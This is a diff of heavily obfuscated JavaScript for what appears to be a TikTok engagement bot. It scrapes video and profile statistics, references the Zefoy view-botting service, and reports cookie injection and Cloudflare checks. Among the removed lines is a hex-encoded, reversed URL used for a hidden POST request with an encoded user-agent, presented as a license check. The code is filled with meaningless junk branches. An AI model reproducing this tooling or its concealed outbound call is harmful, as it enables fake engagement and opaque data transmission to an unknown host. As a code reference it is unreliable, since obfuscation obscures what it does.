+  const vV478 = v478;
+  return vV478.wHuoJ(vV478.wlPxj(vV478.tImlJ(vV478.balRP(process.hrtime()[0], 1000000000), process.hrtime()[1]), vV478.RMELA(vV478.zhAwg(v67[0], 1000000000), v67[1])), 60000000000).toFixed(2);
 }
-function f56(p1378) {
-  const v459 = {
-    XsGwS: function (p1379, p1380) {
-      return p1379(p1380);
+function f56() {
+  const v479 = {
+    wQJnI: function (p1497, p1498) {
+      return p1497 / p1498;
     },
-    LFCQf: function (p1381, p1382) {
-      return p1381 ^ p1382;
+    pBrGC: function (p1499) {
+      return p1499();
+    }
+  };
+  const v480 = v479.wQJnI(v479.pBrGC(f55), 60);
+  const v481 = v479.wQJnI(v72, v480);
+  return Math.round(v481);
+}
+function f57(p1500) {
+  const v482 = {
+    GCCUd: function (p1501, p1502) {
+      return p1501 + p1502;
     },
-    CEpdW: function (p1383, p1384) {
-      return p1383 === p1384;
+    hjcZS: function (p1503, p1504) {
+      return p1503 - p1504;
     },
-    iHrFh: "tFPTf",
-    nTDrB: "eqNIu",
-    hFqLC: function (p1385, p1386) {
-      return p1385(p1386);
+    inKTl: function (p1505, p1506) {
+      return p1505 - p1506;
     },
-    fHcmX: function (p1387, p1388) {
-      return p1387 !== p1388;
+    yiLsM: function (p1507, p1508) {
+      return p1507 > p1508;
     },
-    THqUL: "wbTlE",
-    cLUoO: function (p1389, p1390) {
-      return p1389(p1390);
+    JjiUm: function (p1509, p1510) {
+      return p1509 !== p1510;
     },
-    PSTgb: function (p1391, p1392) {
-      return p1391 !== p1392;
+    YlwSt: "lqaNC",
+    xVrht: function (p1511, p1512) {
+      return p1511(p1512);
     },
-    ULjHb: "vhacH",
-    aDajJ: "DLmQB"
+    dhkQu: function (p1513, p1514) {
+      return p1513 !== p1514;
+    },
+    qWfWR: "wyzOs",
+    YtXAX: function (p1515, p1516) {
+      return p1515(p1516);
+    },
+    JLvvH: function (p1517, p1518) {
+      return p1517 !== p1518;
+    },
+    XajBK: "DKEiM"
   };
   try {
-    if (v459.CEpdW(v459.iHrFh, v459.nTDrB)) {
-      v459 = "";
+    if (v482.JjiUm(v482.YlwSt, v482.YlwSt)) {
+      const v483 = z ? function () {
+        if (v483) {
+          const v484 = o.apply(L, arguments);
+          T = null;
+          return v484;
+        }
+      } : function () {};
+      J = false;
+      return v483;
     } else {
-      const v460 = v459.hFqLC(a0zN, p1378);
-      const v461 = v460.text();
-      const v462 = v461.match(/"liveRoomStats":\s*{\s*"userCount":\s*(\d+)/);
-      if (v462) {
-        if (v459.fHcmX(v459.THqUL, v459.THqUL)) {
-          v459.XsGwS(y, v460);
-          return null;
+      const v485 = v482.xVrht(a0ia, p1500);
+      const v486 = v485.text();
+      const v487 = v486.match(/"liveRoomStats":\s*{\s*"userCount":\s*(\d+)/);
+      if (v487) {
+        if (v482.dhkQu(v482.qWfWR, v482.qWfWR)) {
+          const v488 = D.intToRGBA(l.getPixelColor(M, q));
+          const v489 = v482.GCCUd(v482.GCCUd(o.abs(v482.hjcZS(v488.r, v488.g)), L.abs(v482.hjcZS(v488.g, v488.b))), T.abs(v482.inKTl(v488.r, v488.b)));
+          if (v482.yiLsM(v489, Q)) {
+            B.setPixelColor(v, G, Y);
+          }
         } else {
-          const v463 = v459.cLUoO(parseInt, v462[1]);
-          return v463;
+          const v490 = v482.YtXAX(parseInt, v487[1]);
+          return v490;
         }
       }
     }
-  } catch (t) {
-    if (v459.PSTgb(v459.ULjHb, v459.aDajJ)) {
-      v459.XsGwS(f53, t);
-      return null;
+  } catch (A) {
+    if (v482.JLvvH(v482.XajBK, v482.XajBK)) {
+      const v491 = H.apply(c, arguments);
+      a = null;
+      return v491;
     } else {
-      let v464 = v459.LFCQf(v.charCodeAt(d), 127);
-      N += v464.toString(16).padStart(2, "0");
+      v482.xVrht(f54, A);
+      return null;
     }
   }
 }
-async function f57(p1393) {
-  const v465 = {
-    UKzYc: function (p1394, p1395) {
-      return p1394 - p1395;
+async function f58(p1519) {
+  const v492 = {
+    QTBSl: function (p1520, p1521) {
+      return p1520 && p1521;
     },
-    SEbUI: function (p1396, p1397) {
-      return p1396(p1397);
+    pPOOQ: function (p1522, p1523) {
+      return p1522(p1523);
     },
-    sgzTm: function (p1398, p1399) {
-      return p1398(p1399);
+    DVZZX: function (p1524, p1525) {
+      return p1524 + p1525;
     },
-    fZrnm: function (p1400, p1401) {
-      return p1400(p1401);
+    aEIxC: function (p1526, p1527) {
+      return p1526 !== p1527;
     },
-    zfVbH: function (p1402, p1403) {
-      return p1402(p1403);
+    wHfdA: "JwwbP",
+    XlNAm: "YzSXG",
+    AGSSw: "ZOpuo",
+    kkSHW: "PyQvJ",
+    MpiYk: function (p1528, p1529) {
+      return p1528 === p1529;
     },
-    cOOFz: function (p1404, p1405) {
-      return p1404 !== p1405;
+    CbZuP: "elRzp",
+    AvQcw: function (p1530, p1531) {
+      return p1530(p1531);
     },
-    wNvvu: "qmNoe",
-    MqJeD: "tZHWy",
-    WGAGx: function (p1406, p1407) {
-      return p1406(p1407);
+    BNnqs: function (p1532, p1533) {
+      return p1532(p1533);
     },
-    hrGdD: "iKpsb",
-    yckVN: "sDrHJ",
-    YWGli: function (p1408, p1409) {
-      return p1408(p1409);
+    oWVIA: function (p1534, p1535) {
+      return p1534(p1535);
     },
-    oMvqb: function (p1410, p1411) {
-      return p1410 === p1411;
-    },
-    fxIDL: "tqwLT",
-    mVfOy: "Rqgpz",
-    FASFS: function (p1412, p1413) {
-      return p1412 === p1413;
-    },
-    SLHAw: "HhXDI"
+    NddVh: "NXjOe",
+    LYljs: "eNxHy",
+    gWbJM: "rShpi",
+    BVkgB: function (p1536, p1537) {
+      return p1536(p1537);
+    }
   };
   try {
-    if (v465.cOOFz(v465.wNvvu, v465.MqJeD)) {
-      const v466 = v465.WGAGx(a0zN, p1393);
-      if (!v466.ok) {
-        if (v465.cOOFz(v465.hrGdD, v465.hrGdD)) {
-          const v467 = v465.UKzYc(v468, v469);
-          N += v467;
-        } else {
+    if (v492.aEIxC(v492.wHfdA, v492.XlNAm)) {
+      const v493 = v492.pPOOQ(a0ia, p1519);
+      if (!v493.ok) {
+        if (v492.aEIxC(v492.AGSSw, v492.kkSHW)) {
           return null;
+        } else if (v492.QTBSl(!w, !A)) {
+          M.stdout.clearLine(0);
+          q.stdout.cursorTo(0);
+          o.stdout.write(L + " Zefoy is unreachable or blocked! :(");
+        } else {
+          v492.pPOOQ(T, "Zefoy is unreachable or blocked! (you need proxy/vpn)");
         }
       }
-      const v468 = v466.text();
-      const v469 = v468.match(/"stats":\s*{\s*"diggCount":(\d+),\s*"shareCount":(\d+),\s*"commentCount":(\d+),\s*"playCount":(\d+),\s*"collectCount":"(\d+)"\s*}/);
-      if (v469) {
-        if (v465.cOOFz(v465.yckVN, v465.yckVN)) {
-          v469.stdout.clearLine(0);
-          N.stdout.cursorTo(0);
-          C.stdout.write(S + " Check Zefoy accessibility...");
-        } else {
-          const [, v470, v471, v472, v473, v474] = v469;
+      const v494 = v493.text();
+      const v495 = v494.match(/"stats":\s*{\s*"diggCount":(\d+),\s*"shareCount":(\d+),\s*"commentCount":(\d+),\s*"playCount":(\d+),\s*"collectCount":"(\d+)"\s*}/);
+      if (v495) {
+        if (v492.MpiYk(v492.CbZuP, v492.CbZuP)) {
+          const [, v496, v497, v498, v499, v500] = v495;
           return {
-            diggCount: v465.YWGli(parseInt, v470),
-            shareCount: v465.zfVbH(parseInt, v471),
-            commentCount: v465.fZrnm(parseInt, v472),
-            playCount: v465.SEbUI(parseInt, v473),
-            collectCount: v465.YWGli(parseInt, v474)
+            diggCount: v492.pPOOQ(parseInt, v496),
+            shareCount: v492.AvQcw(parseInt, v497),
+            commentCount: v492.BNnqs(parseInt, v498),
+            playCount: v492.oWVIA(parseInt, v499),
+            collectCount: v492.BNnqs(parseInt, v500)
           };
+        } else {
+          let v501 = A[p];
+          C[J] = v501[v492.DVZZX(l, 1)];
+          M[v492.DVZZX(q, 1)] = v501;
         }
-      } else if (v465.oMvqb(v465.fxIDL, v465.mVfOy)) {
-        v465.SEbUI(v466, v468);
-        return null;
+      } else if (v492.MpiYk(v492.NddVh, v492.LYljs)) {
+        v492.log("\n\n");
       } else {
         return null;
       }
     } else {
-      const v475 = v465.sgzTm(S, t);
-      if (!v475.ok) {
-        return null;
-      }
-      const v476 = v475.text();
-      const v477 = v476.match(/"stats":\s*{\s*"diggCount":(\d+),\s*"shareCount":(\d+),\s*"commentCount":(\d+),\s*"playCount":(\d+),\s*"collectCount":"(\d+)"\s*}/);
-      if (v477) {
-        const [, v478, v479, v480, v481, v482] = v477;
-        return {
-          diggCount: v465.SEbUI(v475, v478),
-          shareCount: v465.fZrnm(v476, v479),
-          commentCount: v465.zfVbH(v477, v480),
-          playCount: v465.sgzTm(v478, v481),
-          collectCount: v465.sgzTm(v479, v482)
-        };
-      } else {
-        return null;
-      }
+      return [];
     }
-  } catch (J) {
-    if (v465.FASFS(v465.SLHAw, v465.SLHAw)) {
-      v465.WGAGx(f53, J);
+  } catch (M) {
+    if (v492.MpiYk(v492.gWbJM, v492.gWbJM)) {
+      v492.BVkgB(f54, M);
       return null;
     } else {
-      v465.fZrnm(C, "[" + S + "] " + t + " (+" + V + ") [" + I + "] Running: " + U);
+      H.log(c);
+      a.exit(0);
     }
   }
 }
-async function f58(p1414) {
-  const v483 = {
-    hSUXT: "You are using the FREE version limited to ~5000\n",
-    TBpGk: "accumulations. The advantage of acquiring the\n",
-    sssaM: "license is that the bot continues to work\n",
-    MopiP: "indefinitely and accumulates large amounts.\n",
-    ZrzlL: function (p1415, p1416, p1417) {
-      return p1415(p1416, p1417);
+async function f59(p1538) {
+  const v502 = {
+    UDxWY: "00000000",
+    rYTgX: function (p1539, p1540) {
+      return p1539 + p1540;
     },
-    JTwUu: function (p1418, p1419) {
-      return p1418(p1419);
+    mfmrZ: "utf8",
+    EzOlR: function (p1541, p1542) {
+      return p1541 !== p1542;
     },
-    psLgA: function (p1420, p1421) {
-      return p1420(p1421);
+    gylxk: "moVPE",
+    rQlMt: "SgVTi",
+    nPmfk: function (p1543, p1544) {
+      return p1543(p1544);
     },
-    DsvCT: "67f283030333a3232323e2433313e28333e21353f2f2a307474786",
-    Gcqlb: "POST",
-    myEmf: "text/plain",
-    BmsoS: function (p1422, p1423) {
-      return p1422(p1423);
+    Wcvna: function (p1545, p1546) {
+      return p1545 !== p1546;
     },
-    sahyo: "6343636663562373734323036323635323036346635363136356230373036313739323036363636673232303739363667353732323036336639363336353635673336353",
-    XnWyF: function (p1424, p1425) {
-      return p1424(p1425);
+    umexm: "NjmPf",
+    kvuuB: "Oqpun",
+    cHVZB: "MssXj",
+    tKfTE: function (p1547, p1548) {
+      return p1547 === p1548;
     },
-    yJwwV: function (p1426, p1427) {
-      return p1426 === p1427;
+    YJjhO: "lccXC",
+    ofgVK: "SjJtx",
+    IJbkr: function (p1549, p1550) {
+      return p1549 !== p1550;
     },
-    eteGd: function (p1428, p1429) {
-      return p1428 !== p1429;
-    },
-    aFydY: "HatwF",
-    zpEhh: function (p1430, p1431) {
-      return p1430(p1431);
-    },
-    tIhrg: function (p1432, p1433) {
-      return p1432 === p1433;
-    },
-    Jlpyk: "AgGlU",
-    lRoNe: "fTGtK",
-    JDgcI: function (p1434, p1435) {
-      return p1434 !== p1435;
-    },
-    KvjEr: "fvave",
-    VWJEU: "mDCBb",
-    thiJX: "POcPu"
+    ZceUn: "rbgmw",
+    tOYks: function (p1551, p1552) {
+      return p1551(p1552);
+    }
   };
   try {
-    if (v483.eteGd(v483.aFydY, v483.aFydY)) {
-      d.stdout.clearLine(0);
-      N.stdout.cursorTo(0);
-      C.stdout.write(S + " Accumulation limit reached!");
-    } else {
-      const v484 = v483.zpEhh(a0zN, p1414);
-      if (!v484.ok) {
-        if (v483.tIhrg(v483.Jlpyk, v483.lRoNe)) {
-          v484.info("\n\n", v483.hSUXT, v483.TBpGk, v483.sssaM, v483.MopiP, v485 + " Buy license in[35m " + v486 + "[0m\n");
-        } else {
+    if (v502.EzOlR(v502.gylxk, v502.rQlMt)) {
+      const v503 = v502.nPmfk(a0ia, p1538);
+      if (!v503.ok) {
+        if (v502.Wcvna(v502.umexm, v502.kvuuB)) {
           return null;
+        } else {
+          return false;
         }
       }
-      const v485 = v484.text();
-      const v486 = v485.match(/"canonical":"https:\\u002F\\u002Fwww\.tiktok\.com\\u002F@\w+\\u002F(?:video|photo)\\u002F(\d+)"/);
-      if (v486 && v486[1]) {
-        if (v483.JDgcI(v483.KvjEr, v483.KvjEr)) {
-          v486 += C.fromCharCode(v483.ZrzlL(S, t.substr(V, 2), 16));
+      const v504 = v503.text();
+      const v505 = v504.match(/"canonical":"https:\\u002F\\u002Fwww\.tiktok\.com\\u002F@\w+\\u002F(?:video|photo)\\u002F(\d+)"/);
+      if (v505 && v505[1]) {
+        if (v502.Wcvna(v502.cHVZB, v502.cHVZB)) {
+          v503 = "Extracting comments (" + v504.length + ")...";
         } else {
-          return v486[1];
+          return v505[1];
         }
-      } else if (v483.eteGd(v483.VWJEU, v483.VWJEU)) {
-        v483.JTwUu(v483, "Chrome/Chromium executable is invalid!");
+      } else if (v502.tKfTE(v502.YJjhO, v502.ofgVK)) {
+        return v502.UDxWY;
+      } else {
+        return null;
+      }
+    } else {
+      P.log("Video:[36m " + H.video + " [0m");
+    }
+  } catch (p) {
+    if (v502.IJbkr(v502.ZceUn, v502.ZceUn)) {
+      H.appendFileSync(c, v502.rYTgX(a, "\n"), v502.mfmrZ);
+    } else {
+      v502.tOYks(f54, p);
+      return null;
+    }
+  }
+}
+async function f60(p1553) {
+  const v506 = {
+    gnGwl: function (p1554, p1555) {
+      return p1554(p1555);
+    },
+    YUsLc: function (p1556, p1557) {
+      return p1556 + p1557;
+    },
+    jngXa: function (p1558, p1559) {
+      return p1558 > p1559;
+    },
+    oBLsc: "--disable-gpu",
+    BJljp: "--disable-gpu-compositing",
+    GHDPM: function (p1560, p1561) {
+      return p1560(p1561);
+    },
+    edCxI: function (p1562, p1563) {
+      return p1562 !== p1563;
+    },
+    fzmJE: "YVWqT",
+    QYTrq: "NcZex",
+    rmjPP: function (p1564, p1565, p1566) {
+      return p1564(p1565, p1566);
+    },
+    QAtsl: function (p1567, p1568) {
+      return p1567 + p1568;
+    },
+    CImHN: "https://livecounts.io",
+    oqIIg: "https://livecounts.io/",
+    sHFWT: function (p1569, p1570) {
+      return p1569 === p1570;
+    },
+    vOqQd: "iyhRA",
+    eXJaD: "Lfocl",
+    kLUvf: function (p1571, p1572) {
+      return p1571(p1572);
+    }
+  };
+  try {
+    if (v506.edCxI(v506.fzmJE, v506.QYTrq)) {
+      const v507 = await v506.GHDPM(f59, p1553);
+      const v508 = v506.rmjPP(a0ia, v506.QAtsl(v49, v507), {
+        headers: {
+          origin: v506.CImHN,
+          referer: v506.oqIIg,
+          "user-agent": v75
+        }
+      });
+      if (!v508.ok) {
+        if (v506.sHFWT(v506.vOqQd, v506.vOqQd)) {
+          return null;
+        } else {
+          const v509 = v506.gnGwl(v508, v506.YUsLc(v511, v512));
+          const v510 = v509.json();
+          if (v506.jngXa(v510.length, 0)) {
+            return v510[0].word;
+          } else {
+            return v509;
+          }
+        }
+      }
+      const v511 = v508.json();
+      const v512 = {
+        playCount: v511.viewCount,
+        diggCount: v511.likeCount,
+        commentCount: v511.commentCount,
+        shareCount: v511.shareCount
+      };
+      return v512;
+    } else {
+      v506 = [...H, v506.oBLsc, v506.BJljp];
+    }
+  } catch (p) {
+    if (v506.sHFWT(v506.eXJaD, v506.eXJaD)) {
+      v506.kLUvf(f54, p);
+      return null;
+    } else {
+      v506.GHDPM(v506, H);
+      return null;
+    }
+  }
+}
+async function f61(p1573) {
+  const v513 = {
+    DwkXp: function (p1574, p1575) {
+      return p1574(p1575);
+    },
+    YORsE: function (p1576, p1577) {
+      return p1576 !== p1577;
+    },
+    sQzTs: "aOcYz",
+    cWFXr: function (p1578, p1579) {
+      return p1578 === p1579;
+    },
+    Unqdo: "ABsJq",
+    nvhOG: "dFIdL",
+    YYRYy: function (p1580, p1581) {
+      return p1580(p1581);
+    },
+    Kbeox: function (p1582, p1583) {
+      return p1582(p1583);
+    },
+    jtrhT: function (p1584, p1585) {
+      return p1584(p1585);
+    },
+    wSrDf: "lYIQM",
+    ezyMZ: "fTEKt",
+    PbEgk: function (p1586, p1587) {
+      return p1586(p1587);
+    }
+  };
+  try {
+    const v514 = v513.DwkXp(a0ia, p1573);
+    if (!v514.ok) {
+      if (v513.YORsE(v513.sQzTs, v513.sQzTs)) {
+        v514.log(v515);
+        return false;
       } else {
         return null;
       }
     }
-  } catch (V) {
-    if (v483.tIhrg(v483.thiJX, v483.thiJX)) {
-      v483.psLgA(f53, V);
-      return null;
-    } else {
-      const v487 = v483.ZrzlL(V, v483.psLgA(I, v483.DsvCT), {
-        method: v483.Gcqlb,
-        headers: {
-          "Content-Type": v483.myEmf,
-          "user-agent": v483.BmsoS(v487, v483.sahyo)
-        },
-        body: v483.psLgA(v488, r)
-      });
-      const v488 = v483.XnWyF(J, v487.text());
-      A = !!v488.a;
-      if (F.includes(p)) {
-        if (v483.yJwwV(v488.v, 0)) {
-          return false;
+    const v515 = v514.text();
+    const v516 = v515.match(/"stats":\s*{\s*"followerCount":(\d+),\s*"followingCount":(\d+),\s*"heart":(\d+),\s*"heartCount":(\d+),\s*"videoCount":(\d+),\s*"diggCount":(\d+),\s*"friendCount":(\d+)\s*}/);
+    if (v516) {
+      if (v513.cWFXr(v513.Unqdo, v513.nvhOG)) {
+        if (/Security Check/.test(v515)) {
+          z.log("Cloudflare Valid / Freer Expired");
+        } else {
+          w.log("Cloudflare Valid / Freer Valid");
         }
         return true;
       } else {
-        return false;
+        const [, v517, v518, v519, v520, v521, v522, v523] = v516;
+        return {
+          followerCount: v513.DwkXp(parseInt, v517),
+          followingCount: v513.DwkXp(parseInt, v518),
+          heart: v513.DwkXp(parseInt, v519),
+          heartCount: v513.YYRYy(parseInt, v520),
+          videoCount: v513.Kbeox(parseInt, v521),
+          diggCount: v513.jtrhT(parseInt, v522),
+          friendCount: v513.Kbeox(parseInt, v523)
+        };
       }
-    }
-  }
-}
-async function f59(p1436) {
-  const v489 = {
-    BAcsH: function (p1437, p1438) {
-      return p1437(p1438);
-    },
-    BuXcG: function (p1439, p1440) {
-      return p1439 + p1440;
-    },
-    WlKys: function (p1441, p1442) {
-      return p1441 + p1442;
-    },
-    lfWDm: " Solve captcha automatically...",
-    bRKOE: function (p1443, p1444) {
-      return p1443 === p1444;
-    },
-    gFqmL: "tdFhF",
-    Coldf: function (p1445, p1446, p1447) {
-      return p1445(p1446, p1447);
-    },
-    nRatf: function (p1448, p1449) {
-      return p1448 + p1449;
-    },
-    FIHrc: "https://livecounts.io",
-    TWOKf: "https://livecounts.io/",
-    zqjmO: function (p1450, p1451) {
-      return p1450 === p1451;
-    },
-    WLhld: "GYdvi",
-    NkcJy: "eEkHw",
-    UTMus: function (p1452, p1453) {
-      return p1452 === p1453;
-    },
-    KrtNo: "UGcah",
-    gcIQU: "kxZTP"
-  };
-  try {
-    if (v489.bRKOE(v489.gFqmL, v489.gFqmL)) {
-      const v490 = await v489.BAcsH(f58, p1436);
-      const v491 = v489.Coldf(a0zN, v489.nRatf(v51, v490), {
-        headers: {
-          origin: v489.FIHrc,
-          referer: v489.TWOKf,
-          "user-agent": v77
-        }
-      });
-      if (!v491.ok) {
-        if (v489.zqjmO(v489.WLhld, v489.NkcJy)) {
-          v489.BAcsH(p1436, "Solve the captcha manually...");
-        } else {
-          return null;
-        }
-      }
-      const v492 = v491.json();
-      const v493 = {
-        playCount: v492.viewCount,
-        diggCount: v492.likeCount,
-        commentCount: v492.commentCount,
-        shareCount: v492.shareCount
-      };
-      return v493;
+    } else if (v513.cWFXr(v513.wSrDf, v513.ezyMZ)) {
+      a.stdout.clearLine(0);
+      z.stdout.cursorTo(0);
+      w.stdout.write(A + " Cookies injected! (" + p + ")");
     } else {
-      N.stdout.clearLine(0);
-      C.stdout.cursorTo(0);
-      S.stdout.write(v489.BuXcG(t, " Check browser (" + V.substring(0, 34) + ")..."));
-    }
-  } catch (V) {
-    if (v489.UTMus(v489.KrtNo, v489.gcIQU)) {
-      d.stdout.clearLine(0);
-      N.stdout.cursorTo(0);
-      C.stdout.write(v489.WlKys(S, v489.lfWDm));
-    } else {
-      v489.BAcsH(f53, V);
       return null;
     }
+  } catch (q) {
+    v513.PbEgk(f54, q);
+    return null;
   }
 }
-async function f60(p1454) {
-  const v494 = {
-    ecCFw: function (p1455, p1456) {
-      return p1455 - p1456;
+async function f62(p1588) {
+  const v524 = {
+    gUuHO: function (p1589, p1590) {
+      return p1589(p1590);
     },
-    GCWcP: function (p1457, p1458) {
-      return p1457 + p1458;
+    aLINX: function (p1591, p1592) {
+      return p1591 + p1592;
     },
-    qwMMj: function (p1459, p1460) {
-      return p1459 + p1460;
-    },
-    rJWRn: function (p1461, p1462) {
-      return p1461 + p1462;
-    },
-    dhOXH: function (p1463, p1464) {
-      return p1463 + p1464;
-    },
-    JfZkt: function (p1465, p1466) {
-      return p1465 + p1466;
-    },
-    Swdce: function (p1467, p1468) {
-      return p1467 + p1468;
-    },
-    TgZbD: function (p1469, p1470) {
-      return p1469 + p1470;
-    },
-    FvwBV: function (p1471, p1472) {
-      return p1471 + p1472;
-    },
-    VCmBB: function (p1473, p1474) {
-      return p1473 + p1474;
-    },
-    OnFhe: function (p1475, p1476) {
-      return p1475 + p1476;
-    },
-    ipdXh: function (p1477, p1478) {
-      return p1477 + p1478;
-    },
-    pjXaU: function (p1479, p1480) {
-      return p1479 + p1480;
-    },
-    IpxNA: function (p1481, p1482) {
-      return p1481 + p1482;
-    },
-    YgGAE: function (p1483, p1484) {
-      return p1483 + p1484;
-    },
-    LQJIh: function (p1485, p1486) {
-      return p1485 + p1486;
-    },
-    vYxCs: function (p1487, p1488) {
-      return p1487 + p1488;
-    },
-    ygPiY: function (p1489, p1490) {
-      return p1489 + p1490;
-    },
-    mdQIG: function (p1491, p1492) {
-      return p1491 + p1492;
-    },
-    HGsmk: function (p1493, p1494) {
-      return p1493 + p1494;
-    },
-    gKick: function (p1495, p1496) {
-      return p1495 + p1496;
-    },
-    tSbBy: function (p1497, p1498) {
-      return p1497 + p1498;
-    },
-    EHtlh: function (p1499, p1500) {
-      return p1499 + p1500;
-    },
-    jOrfu: function (p1501, p1502) {
-      return p1501 + p1502;
-    },
-    QIHTG: function (p1503, p1504) {
-      return p1503 + p1504;
-    },
-    JPsXz: function (p1505, p1506) {
-      return p1505 + p1506;
-    },
-    EDIOa: function (p1507, p1508) {
-      return p1507 + p1508;
-    },
-    AOXLM: function (p1509, p1510) {
-      return p1509 + p1510;
-    },
-    oBuKI: function (p1511, p1512) {
-      return p1511 + p1512;
-    },
-    tSvTg: function (p1513, p1514) {
-      return p1513 + p1514;
-    },
-    jMpQo: function (p1515, p1516) {
-      return p1515 + p1516;
-    },
-    ZGUBk: function (p1517, p1518) {
-      return p1517 + p1518;
-    },
-    YBwSr: function (p1519, p1520) {
-      return p1519 + p1520;
-    },
-    htZlM: function (p1521, p1522) {
-      return p1521 + p1522;
-    },
-    VwWJR: function (p1523, p1524) {
-      return p1523 + p1524;
-    },
-    Neqis: function (p1525, p1526) {
-      return p1525 + p1526;
-    },
-    fnlcN: function (p1527, p1528) {
-      return p1527 + p1528;
-    },
-    bQSif: "6T7Z9M8H4CeVbK5VdKetfyaAb54b9p2JfM053b3k7D0c5FbFdZ5L12716G746rep5FaReLeR1ecj5N8j843h",
-    LmvgJ: "1S3l719Y3BcDbu1d2Z8ScDd091381WaH1O0vb8480N3ocIcreZcDeY223QfQbT4Q8VdU0mbQ4yaL5O4g9x5hatdzc0aU8f8",
-    zcWdu: "Ad87V5L12bI41ek5vdGb3f3dmaQfdcccvfVfe090e38fQ0Ycj3yeOcP453Tb37wd34vdE6n4Qbc3kfk58f3dGbZ904v9Xdr",
-    IqhFv: "1v6HbV3j21141aaM4A8pdX6T2QckbVfgapf35I8z0ie78q1pen4g5mcd5WdLdte0bC6oaVdH2L7Far7Bfy2n423E6P8afSe",
-    LGejQ: "y0Dfm6a12cK7R51526OeGaK9G966r7ndPeZ1kc6377R5neFfN1v3N3J9WaQfre21i4yfH920W7Ac7453C6h20456s9gfS8v",
-    fACKo: "0N3Halai6qcLaYbgbLar2Ebv272X0Cbm5i3q2M1s3d7M6x5r0tfB1L4KeWaY3W21ez3jbZ4W04fSc66J8WfM0830ft7Rfz8",
-    tIkWk: "udo2t9s3QbA116J197KaR6P03cJ7b4w460R7s1Kdf6068eMcvdb2j7acQ2rfP91d5fyaK53aB457K9da98u2Pa31A5N7A0B",
-    wBvqe: "bvabb95gb36I8Mek3na8bt7p7ofjdHfs6Cf22zbkek7l5e207o4wee4k6yal0hfY9s3dfU2ScQ0w7q5v9xdP4a9g7M7wbu3",
-    JbEGq: "D806w02fd049hdBdy9laT2n9GfmaVd92v6e5HdIby2jbp8K1odG3Wag8hcxfzaQ2p0X1G0ReE22aU348Q340i1H9M104n5S",
-    JAvMd: "bj759Ub5fS6V3r5E5f9xdYbFb77NeU3x51du4z0F0yedb96mfl779h5Ab2aZ8X742j8Qbo3s7a8L1p4k7s7Z0Hbvbtat61f",
-    iRCCV: "0eB4h0J2yd27T1f46c99xf46letdZeieX2aeU2Lfb0p4B0f8ndu4Y1q1F028y3V1Q42dady6o5qdg2Ebz9R2UfD3beJ7XaW",
-    lcnqT: "coah3Yameu4J9HeM9h2v5t7u2GbCb19U8t640T814E6U069J3W5td11y6C1E560o8t1l845odP6zas2225b66j6L9YbJaEc",
-    rWroQ: "CaI9saVcMfY0Fehdk4kfMcq9x3CcpaHb665cYfOd0ao0X329W0LcE6Mfzeseb2r9Re2eI1K8LbqcC3A7f3cdQ6yf13Z6b7h",
-    WIxKR: "3b16fa6tfn1xcl6F2n5D2j6Ye2ct6E5J3v1C9x8mf9aQ5v8z566deh1CeUap4l01bN4k0E8u4AbGfP0AfX1uc73V1Weuasf",
-    CWBIc: "Eayfs3H7A8d743P4R5d5Bdjfs4Z810c5Aew1ieE600OeD131397dF1sbi4E4wazcz7E0raYbSem5la7dMbQdTfO4MfW8E70",
-    Gurrv: "eP95dr5saE8u3Z7Ybl1f72fK1xcUfg8f8Nbu4E7FfB1v9V1l5g1SahfR400reR3sapdvb8eoc9fA9gds0Zci4rdl7xaK5Z3",
-    YtFvi: "079dg8m9A6U689F8G2BfmeBaJfZfX7n1P24bI4peCaN1D5DaA169teT1O1pbZ33aybx1P8YcY5B6EeJ5qbu3i8ub87v0M0X",
-    KXqbL: "5ufK3u4Y7baX4v1GaKdr7L1W6o7G8E1LbB921cd48I349YbabG3T3L5g0ObucI8W2ZaR7jfPardw9EeAa0ce7Sedcr5Ac16",
-    ZyCqg: "I3f8HfV5A0D88db7j4u58f1c13Vaw1oe30E858Y4m737qes0p6t8Ldka8ag2y533L88dV600f9u52aDbEfady8uds8Jfm4b",
-    WWmrf: "4o5h3zfh1h3x6D375q6U4M4ub32D59ai5M0m3j8z6M5UfceA7D9W5t0J6vaXd15D7F2D4o8Rf08PcK0WcweI4BcBe4593M1",
-    CKQIP: "L5X6v5T3YdW4S04fQ3p4Fe49Pdv1w3q3zcS899mevfO3Yc15d1M2bcG7L562HbEbWel6z6Cbv7Jd88zaSbg1k3G4O0ybj7e",
-    BnmuB: "0Ef8dTbA8gdPcT4z0ob65cbZdKdU04aCe6eD3R1M525Z18eA1X4Kcu1p0T0x861k4Z572w5oeSaf7S6NeUd948fges2J4a8",
-    oqtpu: "l1fbo5Y1DeHfX9CeT6a5w2O0WcF3M2m4rcM5f9aeH5fcvfF0ufJbudw4w2s8B3t9E4N3C4lfUdK1RaLce8hfUbK116bcN6Q",
-    dnBiF: "f9aS7rbw8l4fcu2S3O2odmdhd48dese6cA632me6fjbhc1dp9Dco8vf60vev2TfZ72aV7j0U0Gb15PcAcudm4Gbu9d0V970",
-    qYXwR: "aeB5Seo7G8KacbwbWfm670x4E2waL9C1obIcKcCbD7M207uapbM41745Feieg335792fU60aw1F62bZ5S3add9faweHcVfq",
-    GbiUO: "0uca7Qe90Ne45L0Pdcbi1B2i8gcI5A9xfTdwc60Ict62b9cT6h8i138U5PeU4X8b5I6a6q9U5qev4o5qe9eA7C5UcEdN8Ub",
-    spVRR: "N7fbTbJ350Xdl0W2f9dac0Qci1Lf19OeV9ye24i7TdR6ff30y2o2K7K18arb38kaudE28cGeneZ5cfs4nf8aSeHba0j631y",
-    FUwmJ: "0a019Xat9Y604uc69abR0B8v1R8s2B2O4Rd52heJ9WaO3q0k5Xbf5B341YddaW0PfC4Qfl8ZdWfEco12aI2L2s7fe770fVc",
-    zQNZr: "iewd2bx3s1qb54c1L7rfu5kcAc822fLeH0k5c3XcM8m6WcKe49B5w0fdnfA5Jfj278E4meU6paB6F1O6d4Aaadd1t1Tdh2N",
-    dbIlJ: "2F6nax0719ag7J4Kc29h4MaI3Rde7IbxfabA0I5T3y5b882ae60X4IfF1F9x8sef2s3S3Cb98921f7becRfVcNfH29c3bWd",
-    Gbmwv: "kaN1r440Y2e8c9gaa5e3v4Wcqdyb8e51p3u7H0F1Q3WaE033h081I6ydF9waCcpaWcBc5f0eS9w7gflcD385M3Ybm5G8T2o",
-    YlgZq: "ed9G8s5waN0K1cca7S6E2f2iaFbV7S7c6G4reNcI6mbj4L3S0u85e38Kc08n118ZdjbYaMds8v3f4paL4BbwdUfE16a48ea",
-    vOhSL: "H7e6q2J36cz93ctfBeX3A4jaP1a4U8JfE6n0ue93z765x6s7K127wau8sbsaUbY5FayeMdD2Fb77JaQ760JfP17au2qeX0v",
